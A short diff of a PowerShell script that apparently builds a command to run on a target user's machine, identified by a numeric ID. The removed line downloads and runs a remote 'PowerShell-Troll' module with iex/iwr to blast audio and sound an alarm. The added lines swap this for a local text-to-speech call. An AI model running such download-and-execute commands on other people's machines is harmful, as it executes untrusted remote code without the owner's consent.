@@ -1,5 +1,8 @@
 $target_user = "49134"
-$command = "iex (iwr https://raw.githubusercontent.com/perplexityjeff/PowerShell-Troll/master/PSTrollFunctions.psm1); Unmute-Audio; Set-AudioMax; Send-Alarm;"
+$command = "Function Speak-Text($Text) { Add-Type -AssemblyName System.speech; `$TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; `$TTS.Speak($Text) }
+Speak-Text "e"
+Exit
+"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
